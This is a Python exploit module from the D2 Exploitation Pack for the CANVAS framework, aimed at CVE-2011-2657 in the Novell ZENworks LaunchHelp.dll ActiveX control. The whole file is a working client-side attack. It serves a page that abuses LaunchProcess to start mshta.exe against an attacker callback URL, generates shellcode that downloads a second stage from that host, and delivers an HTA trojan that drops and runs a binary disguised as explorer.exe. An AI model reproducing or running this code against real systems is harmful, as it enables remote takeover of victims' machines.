#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2012
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.canvasos import *
from MOSDEF import pelib 

import urllib
import struct

# GUI info
NAME = "Novell Zenworks Software Packaging LaunchHelp.dll ActiveX Control Remote Code Execution Vulnerability"

DESCRIPTION = "Remote code execution vulnerability in Novell Zenworks Software Packaging ActiveX"
DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Novell"
DOCUMENTATION["Date public"] = "2011.11.07"
DOCUMENTATION["VersionsAffected"] = "Novell ZENworks 10/11"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-318/"
DOCUMENTATION["CVE Name"] = "CVE-2011-2657"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2657"
DOCUMENTATION["Notes"] = ""

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
Usage:
.\commandlineInterface.py -p 5555 -v 1
.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_launchhelp -l 192.168.1.1 -d 5555 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0 : ["All"], 
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1
        self.badstring = "\x00"
        self.subesp = 0
        self.name = NAME 
        self.filename = "index.html"
        self.trojanname = "index.hta"        
        return


    def file4hta(self, exename):
		evilprog = "explorer.exe"
		e = []
		
		for a in exename:
			for b in a:
				if b == "\r":
				  d = "0d"
				elif b == "\n":
				  d = "0a"
				elif b == "\0":
				  d = "00"
				else:
				  c = hex(ord(b))
				  d = c.replace("0x", "")
				
				if len(d) == 1:
				  d = "0"+d
				
				e.append(d)
		
		i = 0
		j = 0
		l = len(e)
		
		hta = "<SCRIPT language=vbs>\n\n"
		while 1:
		  hta += " prog = prog & \""
		
		  while i != 24:
		    hta += "%s," % e[j]
		    if j == l-1:
		      break
		    i += 1
		    j += 1
		
		  if j == l-1:
		    hta = hta[:-1] + "\"\n\n"
		    break
		  hta += "\"\n"
		  i = 0
		
		hta += " tmp = Split(prog, \",\")\n"	
		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
		hta += " For i = 0 To UBound(tmp)\n"
		hta += "   prog = Int(\"&H\" & tmp(i))\n"
		hta += "   f.Write Chr(prog)\n"
		hta += " Next\n\n"
		hta += " f.Close\n"
		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
		hta += " self.Close\n"
		hta += "</SCRIPT>\n"
		
		return hta 

    def maketrojan(self):		
		host = self.callback.ip
		port = self.callback.port
		
		sc = shellcodeGenerator.win32()
		sc.addAttr("findeipnoesp", {"subespval":0x1000})                
                                                    	
		if self.useSSL:
			ssl = "s"
		else:
			ssl = ""
            
		sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})
		sc.vAllocSelf = True
		shellcode = sc.get()   
             
		myPElib = pelib.PElib()        	
		self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
		
		self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))

		self.htafile = self.file4hta(self.mosdeftrojan)		
		file(self.trojanname, "wb").write(self.htafile)
		self.setInfo("%s - done" % (NAME))
		ret = len(self.mosdeftrojan) != 0
                                    		
		return ret        		
    		        
    def makefile(self):
        filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {		
	var detect = new ActiveXObject("LaunchHelp.HelpLauncher.1");    
    	
	if (detect) {	
		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:7A758D94-E900-11D5-8467-00B0D023B202' id='target'></object>";						
		target.LaunchProcess("mshta.exe", "MOSDEFTROJANURL");   
	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
"""
        filedata = filedata.replace("MOSDEFTROJANURL", "http://" + self.callback.ip + ":" + str(self.callback.port) + "/" + self.trojanname)

        if self.useSSL:
      		filedata = filedata.replace('http:', 'https:')
	
        return filedata

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()                     
                
        if clientheader.URL.count(self.filename):            
            sploitstring = self.makefile()            
            b.setBody(sploitstring)      
        elif clientheader.URL.count(self.trojanname):
            self.maketrojan()   
            self.log("Sending MOSDEF trojan")
            f = open(self.trojanname, "rb")
            sploitstring = f.read()
            f.close()
            os.remove(self.trojanname)
            self.log("Sending %d bytes"%len(sploitstring))
            h.addHeader("Content-type","binary/octet-stream")
            h.addHeader("Connection","close")
            b.setBody(sploitstring)                        
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
    
    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
